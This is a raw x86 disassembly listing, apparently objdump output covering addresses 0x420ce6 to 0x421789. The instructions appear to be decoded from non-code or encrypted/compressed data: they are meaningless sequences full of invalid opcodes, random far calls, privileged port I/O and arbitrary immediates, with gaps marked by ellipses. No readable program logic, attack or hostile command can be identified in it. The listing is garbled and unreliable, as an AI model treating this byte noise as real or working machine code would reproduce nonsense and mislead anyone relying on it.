  420ce6:	addr16 pusha 
  420ce8:	add    DWORD PTR [eax],eax
  420cea:	add    BYTE PTR [ecx],al
  420cec:	add    BYTE PTR [eax],al
  420cee:	into   
  420cef:	jnp    0x420c77
  420cf1:	cld    
  420cf2:	jns    0x420ca6
  420cf4:	pop    ss
  420cf5:	push   edx
  420cf6:	add    eax,0xa9a8edef
  420cfb:	shr    BYTE PTR [eax-0x18e1e911],0x62
  420d02:	sub    DWORD PTR [eax],ebp
  420d04:	jne    0x420ceb
  420d06:	call   0xbfef:0x449dd9f4
  420d0d:	fcom   DWORD PTR [edi]
  420d0f:	lahf   
  420d10:	dec    edx
  420d11:	dec    edi
  420d12:	call   0x978bf733
  420d17:	sub    al,0xd3
  420d19:	push   ecx
  420d1a:	push   cs
  420d1b:	sub    ebp,DWORD PTR [edx-0x24]
  420d1e:	jle    0x420d2b
  420d20:	cwde   
  420d21:	dec    edx
  420d22:	daa    
  420d23:	sub    eax,DWORD PTR [ebp-0x79c25925]
  420d29:	or     ch,al
  420d2b:	cmp    BYTE PTR [edi],0x7c
  420d2e:	les    edx,FWORD PTR [edi+ebp*8+0x13]
  420d32:	jnp    0x420d57
  420d34:	adc    DWORD PTR [edx],ebp
  420d36:	jne    0x420d94
  420d38:	mov    ebp,0xc8c35833
  420d3d:	(bad)  
  420d3e:	addr16 repnz xchg edx,eax
  420d41:	cwde   
  420d42:	data16 loopne 0x420d8e
  420d45:	rol    esp,0x66
  420d48:	pop    edx
  420d49:	and    BYTE PTR [ebx+0xa1a6b1b],bl
  420d4f:	and    BYTE PTR [ebp+0x46],al
  420d52:	popf   
  420d53:	in     al,0x80
  420d55:	or     al,0xbe
  420d57:	mov    ?,WORD PTR ds:0xe195fb42
  420d5d:	into   
  420d5e:	call   0x1c9a:0xf395b5d9
  420d65:	sbb    DWORD PTR [edx+edx*4],ebp
  420d68:	dec    ebx
  420d69:	cli    
  420d6a:	fnsetpm(287 only) 
  420d6c:	lahf   
  420d6d:	cmp    DWORD PTR [edi],edi
  420d6f:	(bad)  
  420d70:	mov    edi,edi
  420d72:	cmp    DWORD PTR [ecx+0x77],esp
  420d75:	mov    ds,WORD PTR [edi+0x45652ba2]
  420d7b:	fisub  WORD PTR [ecx+0x26f0bbf5]
  420d81:	adc    esi,DWORD PTR [bp-0x1e06]
  420d86:	std    
  420d87:	int3   
  420d88:	ins    DWORD PTR es:[edi],dx
  420d89:	sbb    bh,bh
  420d8b:	dec    esp
  420d8c:	push   edi
  420d8d:	inc    ecx
  420d8e:	cmc    
  420d8f:	adc    al,0xc9
  420d91:	dec    edi
  420d92:	out    0x21,al
  420d94:	or     ecx,DWORD PTR [ebx+ebx*1]
  420d97:	mov    ch,0x85
  420d99:	sub    BYTE PTR [ebp+esi*2-0x42],ch
  420d9d:	sbb    cl,0x1d
  420da0:	shl    DWORD PTR [ecx],1
  420da2:	mov    edi,0x707bf6e7
  420da7:	icebp  
  420da8:	pop    ds
  420da9:	stos   DWORD PTR es:[edi],eax
  420daa:	shl    BYTE PTR [edi+0x70],0x3b
  420dae:	scas   al,BYTE PTR es:[edi]
  420daf:	jmp    0x7104:0xda701439
  420db6:	jle    0x420d61
  420db8:	int3   
  420db9:	outs   dx,DWORD PTR ds:[esi]
  420dba:	ja     0x420d8f
  420dbc:	cmp    edi,DWORD PTR [esi+0x21]
  420dbf:	scas   eax,DWORD PTR es:[edi]
  420dc0:	retf   0x8c7e
  420dc3:	push   edx
  420dc4:	jnp    0x420e3c
  420dc6:	loopne 0x420db6
  420dc8:	pop    ds
  420dc9:	retf   0x1a05
  420dcc:	lock inc esp
  420dce:	push   eax
  420dcf:	mov    bh,BYTE PTR [esi+esi*2]
  420dd2:	mov    al,0x43
  420dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dd5:	aas    
  420dd6:	adc    DWORD PTR [esi-0x5d6c56e1],eax
  420ddc:	popa   
  420ddd:	in     eax,0x32
  420ddf:	push   ebp
  420de0:	in     eax,dx
  420de1:	mov    ecx,0x3f2f272a
  420de6:	pop    esi
  420de7:	or     ecx,edi
  420de9:	inc    esi
  420dea:	xor    ch,BYTE PTR [esi-0x6c]
  420ded:	mov    edx,0x0
	...
  420e56:	out    0x1e,eax
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0x911138b2
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	mov    esi,0x8aa8c357
  420e73:	and    ebp,DWORD PTR [edx-0x4f]
  420e76:	fidiv  WORD PTR ss:[ebx+0x1e]
  420e7a:	lock fwait
  420e7c:	popf   
  420e7d:	adc    eax,0x3ddfb11d
  420e82:	icebp  
  420e83:	lds    edx,FWORD PTR ds:0xbacf3b65
  420e89:	ret    
  420e8a:	mov    eax,0x3c2da201
  420e8f:	hlt    
  420e90:	mov    esp,0x4b74b98a
  420e95:	imul   ebp,edx,0xffffffd5
  420e98:	pop    ebp
  420e99:	sub    al,cl
  420e9b:	push   eax
  420e9c:	arpl   WORD PTR [ecx+0x72],bp
  420e9f:	jg     0x420ed6
  420ea1:	xor    esp,DWORD PTR [edx+eax*4-0x40218941]
  420ea8:	xor    DWORD PTR ds:0x58e4d5d0,ecx
  420eae:	push   eax
  420eaf:	add    eax,0x2225a4d8
  420eb4:	jg     0x420e63
  420eb6:	xchg   edi,eax
  420eb7:	jmp    FWORD PTR [edx]
  420eb9:	cdq    
  420eba:	shl    BYTE PTR [edx-0x75],cl
  420ebd:	mov    al,ds:0x8dab3fd2
  420ec2:	fwait
  420ec3:	iret   
  420ec4:	mov    al,0x1f
  420ec6:	nop
  420ec7:	idiv   BYTE PTR [esi-0x33ed997d]
  420ecd:	inc    ebp
  420ece:	push   edi
  420ecf:	aad    0x25
  420ed1:	idiv   cl
  420ed3:	call   0xeb58:0x963347c9
  420eda:	fwait
  420edb:	js     0x420ed1
  420edd:	add    ah,ah
  420edf:	dec    edi
  420ee0:	mov    edi,0x8d8d8f3b
  420ee5:	add    esp,edi
  420ee7:	xor    ebp,0x52222e10
  420eed:	mov    edx,0x3b884494
  420ef2:	mov    edx,DWORD PTR [eax]
  420ef4:	adc    BYTE PTR [edx+0x3bc21f72],0xbb
  420efb:	add    al,0xf4
  420efd:	ss dec ebx
  420eff:	add    BYTE PTR [edi],0xb4
  420f02:	sar    BYTE PTR [edi-0x7ca23be2],1
  420f08:	inc    esi
  420f09:	jecxz  0x420ea9
  420f0b:	push   edi
  420f0c:	pop    ecx
  420f0d:	fs dec ebx
  420f0f:	lds    esi,FWORD PTR [eax+0x57]
  420f12:	sbb    edx,DWORD PTR [eax+0x409a1245]
  420f18:	sbb    BYTE PTR [ecx],al
  420f1a:	test   eax,0x74e5b786
  420f1f:	sahf   
  420f20:	push   edx
  420f21:	inc    ecx
  420f22:	je     0x420f2d
  420f24:	std    
  420f25:	add    DWORD PTR [ebx+esi*2],ebx
  420f28:	mov    ch,0xae
  420f2a:	dec    eax
  420f2b:	inc    edi
  420f2c:	aam    0x83
  420f2e:	(bad)  
  420f2f:	fdiv   DWORD PTR [ebx+0x36eed419]
  420f35:	push   edi
  420f36:	dec    ebp
  420f37:	and    edx,DWORD PTR [ebx+0x4e6d1565]
  420f3d:	aas    
  420f3e:	hlt    
  420f3f:	call   DWORD PTR [edx-0x38]
  420f42:	std    
  420f43:	mov    ebp,0xef833bb5
  420f48:	mov    DWORD PTR [eax-0x6e1b4f8c],0x4edbb52a
  420f52:	dec    esi
  420f53:	cld    
  420f54:	mov    ecx,0xc05cdfc9
  420f59:	(bad)  
  420f5a:	mov    ebp,0x933866c9
  420f5f:	jg     0x420f3d
  420f61:	popa   
  420f62:	adc    DWORD PTR [eax-0x309b4ea0],ebx
  420f68:	scas   al,BYTE PTR es:[edi]
  420f69:	add    BYTE PTR [eax+0xd1df4d],dl
	...
  420fd3:	add    BYTE PTR [eax],al
  420fd5:	add    BYTE PTR [eax],ah
  420fd7:	xchg   edi,eax
  420fd8:	inc    edx
  420fd9:	shl    edi,cl
  420fdb:	xlat   BYTE PTR ds:[ebx]
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi+0x7008ecf4]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    BYTE PTR [edx+0x1804346c],cl
  420ff3:	add    DWORD PTR [ecx-0x2b8562dd],ebp
  420ff9:	push   ebp
  420ffa:	adc    eax,DWORD PTR [ecx+0x5c]
  420ffd:	pop    esp
  420ffe:	mov    ah,BYTE PTR [ecx+eiz*4]
  421001:	mov    dl,0xa8
  421003:	sub    esi,DWORD PTR [edi-0x452ab425]
  421009:	inc    esi
  42100a:	sub    DWORD PTR [eax-0x64],edx
  42100d:	shr    BYTE PTR cs:[edx+0x14],cl
  421011:	jmp    0x770b:0xe3f19e6e
  421018:	out    dx,al
  421019:	imul   eax,DWORD PTR [ebx+0x40],0xffffffb3
  42101d:	sbb    ebp,0x5b71a082
  421023:	adc    eax,0x70be34bc
  421028:	pusha  
  421029:	xchg   ebp,eax
  42102a:	int3   
  42102b:	pop    ebx
  42102c:	(bad)  
  42102d:	test   eax,0x9fedc098
  421032:	mov    eax,ds:0xb470f6a3
  421037:	ins    BYTE PTR es:[edi],dx
  421038:	nop
  421039:	popf   
  42103a:	jl     0x421080
  42103c:	or     DWORD PTR [edx-0x7c],esp
  42103f:	div    DWORD PTR [eax-0x3b]
  421042:	xchg   esp,eax
  421043:	inc    edx
  421044:	push   edx
  421045:	(bad)  
  421046:	xchg   ecx,eax
  421047:	jp     0x421034
  421049:	in     eax,0x74
  42104b:	cmp    eax,0x88691f3f
  421050:	jp     0x421062
  421052:	adc    BYTE PTR [ebp-0x4],ah
  421055:	stos   BYTE PTR es:[edi],al
  421056:	sbb    esi,DWORD PTR [edi+0x71]
  421059:	jl     0x421041
  42105b:	shl    DWORD PTR [eax-0x16d4efee],1
  421061:	pop    edx
  421062:	lahf   
  421063:	pop    esi
  421064:	ret    0x3664
  421067:	sub    eax,0xae3a22bd
  42106c:	test   BYTE PTR [edi],0x5d
  42106f:	and    ebp,DWORD PTR [eax-0x65ce2382]
  421075:	jp     0x4210f5
  421077:	add    al,0xb8
  421079:	mov    ds,esi
  42107b:	imul   esp,DWORD PTR ds:0x84877318,0x59baddf6
  421085:	push   es
  421086:	iret   
  421087:	repz mov ch,0x9a
  42108a:	sbb    eax,0x8a5ea6e1
  42108f:	sbb    eax,0x40085f6e
  421094:	repnz dec esp
  421096:	jp     0x4210d2
  421098:	ins    BYTE PTR es:[edi],dx
  421099:	push   esi
  42109a:	mov    cl,0xee
  42109c:	sub    eax,DWORD PTR [esi-0x519dacf9]
  4210a2:	sbb    bh,BYTE PTR [eax+ebx*8-0x3609f92a]
  4210a9:	add    ebp,DWORD PTR [eax]
  4210ab:	(bad)  
  4210ac:	xchg   BYTE PTR [ebx],dh
  4210ae:	mov    dl,0xc1
  4210b0:	jmp    0x9dc1e490
  4210b5:	and    BYTE PTR [ebp+0x2],ah
  4210b8:	clc    
  4210b9:	aas    
  4210ba:	ins    BYTE PTR es:[edi],dx
  4210bb:	test   al,0x97
  4210bd:	pop    esi
  4210be:	loop   0x421126
  4210c0:	das    
  4210c1:	mov    al,0xa4
  4210c3:	mov    al,BYTE PTR [ecx-0x33]
  4210c6:	sete   BYTE PTR [ebp-0x70]
  4210ca:	sbb    BYTE PTR [ecx+0x66],dh
  4210cd:	xchg   edx,eax
  4210ce:	out    0x6,al
  4210d0:	outs   dx,BYTE PTR ds:[esi]
  4210d1:	aam    0x16
  4210d3:	jb     0x421131
  4210d5:	inc    ecx
  4210d6:	fcmovnbe st,st(2)
  4210d8:	dec    edi
  4210d9:	lea    esi,[edi+edi*8+0x6c22e672]
  4210e0:	jmp    0xdcf1c774
  4210e5:	or     eax,0xefffca10
  4210ea:	(bad)  
  4210ec:	call   0x421119
	...
  421155:	add    BYTE PTR [edi-0x243925a2],bl
  42115b:	(bad)  
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    fs,ebp
  421163:	cld    
  421164:	and    dh,ch
  421166:	arpl   WORD PTR [bx+di],ax
  421169:	add    BYTE PTR [eax],al
  42116b:	add    DWORD PTR [eax],eax
  42116d:	add    BYTE PTR [edx],ah
  42116f:	jge    0x42118f
  421171:	sbb    BYTE PTR [ebp-0x16],al
  421174:	jg     0x421173
  421176:	ret    0x39b5
  421179:	(bad)  
  42117b:	dec    esi
  42117c:	setl   BYTE PTR [ecx]
  42117f:	or     eax,0xacd9fc54
  421184:	fs jle 0x421126
  421187:	outs   dx,DWORD PTR ds:[esi]
  421188:	push   esi
  421189:	dec    esp
  42118a:	jle    0x4211c0
  42118c:	dec    ebx
  42118d:	aam    0x4b
  42118f:	enter  0x6835,0x90
  421193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421194:	mov    al,0x4d
  421196:	lahf   
  421197:	xchg   esi,eax
  421199:	sbb    eax,0xe728a841
  42119e:	xor    eax,DWORD PTR [edx]
  4211a0:	adc    bl,BYTE PTR [eax+0x6c]
  4211a3:	xchg   DWORD PTR [eax+ebp*8+0x40397686],edi
  4211aa:	mov    al,0x86
  4211ac:	jo     0x4211f6
  4211ae:	popa   
  4211af:	das    
  4211b0:	pop    edi
  4211b1:	jno    0x4211f7
  4211b3:	sbb    BYTE PTR [esi+0x6a5d1162],al
  4211b9:	adc    al,0x96
  4211bb:	paddsw mm4,QWORD PTR [edi+0x0]
  4211bf:	pop    ds
  4211c0:	sti    
  4211c1:	sahf   
  4211c2:	cmp    DWORD PTR [edx-0x73],ecx
  4211c5:	jno    0x4211d9
  4211c7:	scas   eax,DWORD PTR es:[edi]
  4211c8:	leave  
  4211c9:	loopne 0x421153
  4211cb:	out    dx,eax
  4211cc:	mov    esp,esi
  4211ce:	js     0x36df0568
  4211d4:	mov    ?,WORD PTR [ecx-0x2e]
  4211d7:	xor    BYTE PTR [edx+0xef0ac15],bl
  4211dd:	ins    DWORD PTR es:[edi],dx
  4211de:	mov    eax,0x80d0b60a
  4211e3:	sbb    eax,0xd104d83e
  4211e8:	lds    ecx,FWORD PTR [ebx+edi*1-0x329ee8f0]
  4211ef:	jb     0x4211cd
  4211f1:	push   es
  4211f2:	leave  
  4211f3:	shl    al,0xc0
  4211f6:	outs   dx,BYTE PTR ds:[esi]
  4211f7:	sbb    DWORD PTR [eax],esi
  4211f9:	test   DWORD PTR [ebx+0x54c649c6],ebp
  4211ff:	clc    
  421200:	inc    esi
  421201:	out    dx,al
  421202:	ret    
  421203:	out    dx,al
  421204:	sub    al,0xd0
  421206:	out    0x6a,al
  421208:	fimul  DWORD PTR es:[esi]
  42120b:	call   0x9de:0x87f86c99
  421212:	std    
  421213:	stc    
  421214:	in     al,0x63
  421216:	mov    ebp,DWORD PTR [edx-0x1f]
  421219:	sahf   
  42121a:	aam    0x1f
  42121c:	xlat   BYTE PTR ds:[ebx]
  42121d:	add    DWORD PTR [ebp+0x6599e316],edi
  421223:	xchg   esi,eax
  421224:	and    al,0x36
  421226:	les    ebp,FWORD PTR [ebx]
  421228:	mov    ebx,0xb8203205
  42122d:	fild   DWORD PTR [eax]
  42122f:	or     DWORD PTR [esi-0x2b94fb61],edi
  421235:	pop    edi
  421236:	inc    ecx
  421237:	enter  0xe5d8,0xda
  42123b:	sbb    eax,0xe80b9837
  421240:	aas    
  421241:	and    eax,ebp
  421243:	pop    ebp
  421244:	bound  esi,QWORD PTR [ecx-0x584f0ef0]
  42124a:	add    BYTE PTR [edi],cl
  42124c:	push   0xffffff8d
  42124e:	add    DWORD PTR [ecx-0x3f],edx
  421251:	push   DWORD PTR [edi]
  421253:	dec    ebp
  421254:	fst    DWORD PTR [esi]
  421256:	sbb    DWORD PTR [edx*2+0x41dccdd7],ebp
  42125d:	sub    DWORD PTR [ebx-0x50],edi
  421260:	mov    ds:0x266d6265,eax
  421265:	mov    dh,0x43
  421267:	data16 jle 0x421237
  42126a:	and    eax,0xbadb8
	...
  4212d3:	add    BYTE PTR [eax],al
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0x8eeb7ab3
  4212e4:	les    ebx,FWORD PTR [eax+0x67]
  4212e7:	add    DWORD PTR fs:[eax],eax
  4212ea:	add    BYTE PTR [ecx],al
  4212ec:	add    BYTE PTR [eax],al
  4212ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212ef:	mov    edi,0x31db02db
  4212f4:	mov    al,0xbc
  4212f6:	push   esi
  4212f7:	adc    esp,DWORD PTR [esi]
  4212f9:	enter  0xad75,0xdf
  4212fd:	mov    edx,0x3832d3ff
  421302:	pop    ecx
  421303:	sar    dh,cl
  421305:	jmp    0x45fe:0x7508ac45
  42130c:	sbb    al,0xbc
  42130e:	inc    eax
  42130f:	ins    BYTE PTR es:[edi],dx
  421310:	outs   dx,DWORD PTR ds:[esi]
  421311:	arpl   WORD PTR [ecx+0x45],bx
  421314:	ins    BYTE PTR es:[edi],dx
  421315:	push   ss
  421316:	adc    eax,0xef68c0af
  42131b:	jno    0x4212cd
  42131d:	fcom   DWORD PTR [edi+0x42a398f7]
  421323:	dec    edi
  421324:	jno    0x4212ff
  421326:	out    dx,eax
  421327:	dec    eax
  421328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42132a:	test   al,0x4c
  42132c:	adc    eax,0x30cb84e5
  421331:	popa   
  421332:	fstp   TBYTE PTR [ebp+eiz*4-0x3d94330b]
  421339:	repz sub DWORD PTR [ebp-0x8c44fcf],0xffffff97
  421341:	lods   al,BYTE PTR ds:[esi]
  421342:	int3   
  421343:	or     BYTE PTR [ecx+ebp*2],al
  421346:	aad    0x97
  421348:	fnstcw WORD PTR [ebx+0x684cad00]
  42134e:	rcr    ebx,0xd7
  421351:	adc    edx,ecx
  421353:	pop    eax
  421354:	dec    esi
  421355:	mov    edi,0x69c3057e
  42135a:	jmp    0x421338
  42135c:	into   
  42135d:	xchg   esp,eax
  42135e:	fisttp QWORD PTR [esi+0x7a]
  421361:	iret   
  421362:	in     eax,0x3
  421364:	stc    
  421365:	push   edi
  421366:	(bad)  
  421367:	in     eax,dx
  421368:	js     0x4213ba
  42136a:	ficomp WORD PTR [ecx]
  42136c:	(bad)  
  42136d:	jae    0x42139f
  42136f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421370:	das    
  421371:	xchg   ebx,eax
  421372:	(bad)  
  421374:	pop    es
  421375:	add    edx,DWORD PTR [eax+0x7b]
  421378:	mov    cl,0x98
  42137a:	fistp  WORD PTR [edx+0x6284516c]
  421380:	mov    eax,ds:0x5aca0fbd
  421385:	les    esi,FWORD PTR [edi-0x7c]
  421388:	pop    ebp
  421389:	aas    
  42138a:	pop    ss
  42138b:	ins    DWORD PTR es:[edi],dx
  42138c:	out    dx,eax
  42138d:	push   0x3d75ad4b
  421392:	mov    ebx,0x346a4431
  421397:	adc    eax,0x36c751bc
  42139c:	jb     0x42133b
  42139e:	es sub al,0xfd
  4213a1:	push   0xa2ebf717
  4213a6:	in     eax,0x90
  4213a8:	and    DWORD PTR [ecx],ecx
  4213aa:	cmc    
  4213ab:	stos   DWORD PTR es:[edi],eax
  4213ac:	xchg   edx,eax
  4213ad:	mov    ecx,0xab31c9f9
  4213b2:	push   ss
  4213b3:	shl    BYTE PTR [ebx-0x7a89ef1e],0x37
  4213ba:	mov    bh,0x6f
  4213bc:	aaa    
  4213bd:	test   al,0x47
  4213bf:	cwde   
  4213c0:	fimul  WORD PTR ds:0xd6874b18
  4213c6:	loop   0x4213b0
  4213c8:	loopne 0x421352
  4213ca:	add    al,BYTE PTR [ecx+0x1b]
  4213cd:	adc    ebx,DWORD PTR [edx+0x12]
  4213d0:	fdivp  st(2),st
  4213d2:	cs cmp eax,0xd9f6fdf
  4213d8:	ds xor eax,ecx
  4213db:	push   0xc0a2e8c2
  4213e0:	xchg   esp,eax
  4213e1:	in     eax,0xa2
  4213e3:	add    al,0x7a
  4213e5:	ror    DWORD PTR [edx+0x29cfc283],0x1d
  4213ec:	mov    dl,0x7
	...
  421456:	inc    bh
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp-0x283a0b61]
  421464:	das    
  421465:	mul    BYTE PTR [edi+0x65]
  421468:	add    DWORD PTR [eax],eax
  42146a:	add    BYTE PTR [ecx],al
  42146c:	add    BYTE PTR [eax],al
  42146e:	test   WORD PTR [esi-0x335b8a38],si
  421475:	lock ja 0x4214bc
  421478:	add    esp,edi
  42147a:	outs   dx,DWORD PTR ds:[esi]
  42147b:	int3   
  42147c:	pop    edx
  42147d:	and    DWORD PTR [edi],eax
  42147f:	pop    ecx
  421480:	and    BYTE PTR [ecx-0x2f626722],ah
  421486:	pop    ebp
  421487:	or     eax,DWORD PTR [edx+0xfb8b482]
  42148d:	dec    esp
  42148e:	std    
  42148f:	xchg   ebp,eax
  421490:	test   BYTE PTR [esi-0x46],dh
  421493:	mov    ch,0xd7
  421495:	mov    WORD PTR [esi+0x12],es
  421498:	xor    bh,dh
  42149a:	hlt    
  42149b:	pop    esi
  42149c:	pop    ds
  42149d:	adc    eax,0x1e79a0a9
  4214a2:	std    
  4214a3:	mov    edi,0x61ba9115
  4214a8:	sub    eax,esi
  4214aa:	inc    esp
  4214ab:	mov    al,0x42
  4214ad:	cmp    edi,DWORD PTR [ebp-0x35]
  4214b0:	fldcw  WORD PTR [ebp+0x1d]
  4214b3:	pop    ss
  4214b4:	jl     0x421495
  4214b6:	ret    0x28cd
  4214b9:	lods   al,BYTE PTR ds:[esi]
  4214ba:	pop    ss
  4214bb:	push   ds
  4214bc:	push   0xeacc8b79
  4214c1:	push   eax
  4214c2:	xchg   DWORD PTR [ebx],esp
  4214c4:	push   ss
  4214c5:	dec    ebp
  4214c6:	psubsb mm4,QWORD PTR [ecx+ecx*8]
  4214ca:	jp     0x4214f7
  4214cc:	sbb    ecx,DWORD PTR [edi]
  4214ce:	jmp    FWORD PTR [edi]
  4214d0:	stos   DWORD PTR es:[edi],eax
  4214d1:	in     al,0xdb
  4214d3:	in     eax,dx
  4214d4:	adc    DWORD PTR [esi],edi
  4214d6:	je     0x4214b9
  4214d8:	add    eax,0x22945ef5
  4214dd:	lods   eax,DWORD PTR ds:[esi]
  4214de:	xchg   ebp,eax
  4214df:	mov    eax,DWORD PTR [ecx+0x17]
  4214e2:	div    DWORD PTR [ebx+0x1a1c9ebc]
  4214e8:	lahf   
  4214e9:	inc    esp
  4214ea:	adc    eax,0x87f76f6c
  4214ef:	call   edx
  4214f1:	and    BYTE PTR [eax+0x33],ah
  4214f4:	cs xchg edx,eax
  4214f6:	mov    ah,0x1c
  4214f8:	push   esi
  4214f9:	jb     0x421524
  4214fb:	push   esp
  4214fc:	sbb    ah,BYTE PTR [ecx-0x29]
  4214ff:	imul   esp,DWORD PTR [ebx],0xffffffd9
  421502:	(bad)  
  421503:	ss inc esp
  421505:	dec    eax
  421506:	adc    al,0xb6
  421508:	jmp    0x4214b1
  42150a:	fucomip st,st(0)
  42150c:	add    edi,ebp
  42150e:	mov    ah,0x42
  421510:	cmp    BYTE PTR [ebp-0x6d],0xa1
  421514:	mov    ecx,0x3e93df9a
  421519:	lahf   
  42151a:	lock int3 
  42151c:	cwde   
  42151d:	xor    al,0x5d
  42151f:	gs jl  0x4214b7
  421522:	push   si
  421524:	cwde   
  421525:	mov    bl,0xd0
  421527:	mov    al,0xa
  421529:	mov    ds:0x71f8435d,al
  42152e:	hlt    
  42152f:	fsubrp st(2),st
  421531:	into   
  421532:	mov    DWORD PTR [ebp+0x6e5a5fda],edi
  421538:	aaa    
  421539:	jge    0x42152e
  42153b:	retf   0xcd05
  42153e:	or     ah,al
  421540:	add    ch,0x45
  421543:	xor    al,BYTE PTR [edx+0x11]
  421546:	or     al,0x8e
  421548:	add    ah,BYTE PTR [ebx-0x374c53b7]
  42154e:	push   esp
  42154f:	int    0xf8
  421551:	aad    0x14
  421553:	mov    eax,ds:0x20534ea1
  421558:	rol    BYTE PTR [ecx+0x8],1
  42155b:	stos   BYTE PTR es:[edi],al
  42155c:	mov    ebx,ebx
  42155e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42155f:	imul   eax,DWORD PTR [ecx],0xe54bd605
  421565:	xchg   BYTE PTR [edx],bl
  421567:	cmc    
  421568:	outs   dx,BYTE PTR ds:[esi]
  421569:	pushf  
  42156a:	out    dx,eax
  42156b:	xchg   edi,eax
  42156c:	mov    cl,0x43
	...
  4215d6:	(bad)  
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax-0x1b21bd4c],bp
  4215e4:	outs   dx,DWORD PTR gs:[esi]
  4215e6:	add    WORD PTR [bx+si],ax
  4215ea:	add    BYTE PTR [ecx],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	add    al,0x45
  4215f0:	movd   DWORD PTR [ebx-0x54],mm2
  4215f4:	xchg   ecx,eax
  4215f5:	(bad)  
  4215f7:	dec    esi
  4215f8:	ins    DWORD PTR es:[edi],dx
  4215f9:	jne    0x4215ba
  4215fb:	inc    esi
  4215fc:	leave  
  4215fd:	inc    edx
  4215fe:	nop
  4215ff:	xlat   BYTE PTR ds:[ebx]
  421600:	pop    esi
  421601:	or     ecx,esp
  421603:	jne    0x421611
  421605:	push   eax
  421606:	or     DWORD PTR [ebp-0x205ce3f4],eax
  42160c:	inc    ebx
  42160d:	sub    eax,0x2b01eab4
  421612:	jo     0x421635
  421614:	or     dh,BYTE PTR [ebp+0x5ad4a513]
  42161a:	sub    eax,0x8d826d82
  42161f:	sub    BYTE PTR [esi],cl
  421621:	inc    edi
  421622:	xchg   ebp,eax
  421623:	jge    0x4215e3
  421625:	mov    al,0x17
  421627:	mov    esp,0x65497fe7
  42162c:	hlt    
  42162d:	mov    eax,0x4e0fecf0
  421632:	test   BYTE PTR [ebp+edi*8+0x5ba19a12],cl
  421639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42163a:	sbb    bh,dh
  42163c:	and    esp,DWORD PTR [edi-0x41301e77]
  421642:	imul   edx,DWORD PTR [edi-0xa],0x48
  421646:	mov    ds:0x8cd8f9c7,al
  42164b:	or     ecx,DWORD PTR [esi+ebx*2+0x23]
  42164f:	jl     0x421679
  421651:	das    
  421652:	ss fwait
  421654:	mov    eax,0xa46d9a7
  421659:	push   edi
  42165a:	mov    dl,0xe
  42165c:	mov    bl,0xb2
  42165e:	cmc    
  42165f:	jae    0x4215e6
  421661:	(bad)  
  421663:	je     0x421694
  421665:	inc    edx
  421666:	popf   
  421667:	xchg   ebp,eax
  421668:	out    0x84,eax
  42166a:	popa   
  42166b:	addr16 leave 
  42166d:	xor    eax,0xadc76684
  421672:	call   0xdf3a:0x91f74908
  421679:	cmp    DWORD PTR [ebx-0x1f6457a2],esp
  42167f:	jmp    0x2536:0x1d888bf7
  421686:	fnstenv [edi+eiz*2]
  421689:	cmp    BYTE PTR [ebx],bl
  42168b:	daa    
  42168c:	sub    al,0x24
  42168e:	xor    eax,0xc0a10508
  421693:	jle    0x4216f7
  421695:	test   eax,0xce5ea496
  42169a:	fucompp 
  42169c:	loop   0x421645
  42169e:	fcomip st,st(2)
  4216a0:	test   DWORD PTR [eax+0x248a04d2],esi
  4216a6:	or     edi,ebx
  4216a8:	call   0x3c74:0xe86a6a45
  4216af:	mov    dh,0x2
  4216b1:	test   al,0x56
  4216b3:	push   ecx
  4216b4:	leave  
  4216b5:	or     al,dl
  4216b7:	wbinvd 
  4216b9:	rcr    BYTE PTR [esp+edx*4+0x7f],cl
  4216bd:	push   esp
  4216be:	add    esi,edi
  4216c0:	add    BYTE PTR [eax-0x4a19fbf3],dl
  4216c6:	mov    al,dl
  4216c8:	sbb    BYTE PTR [edx],bl
  4216ca:	popa   
  4216cb:	adc    al,0xed
  4216cd:	retf   0x844b
  4216d0:	mov    ecx,0x9fd088f8
  4216d5:	lea    edx,[eax+0x31778a0c]
  4216db:	fld    TBYTE PTR [esi-0x69]
  4216de:	sbb    al,0xa
  4216e0:	setne  BYTE PTR [di]
  4216e4:	sub    DWORD PTR [edx-0x20],0x8b5ea69b
  4216eb:	ins    DWORD PTR es:[edi],dx
  4216ec:	mov    DWORD PTR [ecx+0x0],ebx
	...
  421753:	add    BYTE PTR [eax],al
  421755:	add    BYTE PTR [ebx-0x105512d4],ch
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	cmp    eax,0x67e513f4
  421767:	add    DWORD PTR [bx+si],eax
  42176a:	add    BYTE PTR [ecx],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	fstp   DWORD PTR [edx]
  421770:	and    BYTE PTR [ebp-0x28e488cf],bl
  421776:	inc    ebp
  421777:	(bad)  
  421778:	mov    bh,0x66
  42177a:	push   edx
  42177b:	mov    ch,0xd3
  42177d:	cmp    bl,0x3c
  421780:	mov    dh,0xcd
  421782:	sub    BYTE PTR [ebp+0x6c7748d5],0xfd
  421789:	repz xor eax,DWORD PTR [ecx+0xfc9c9cd]
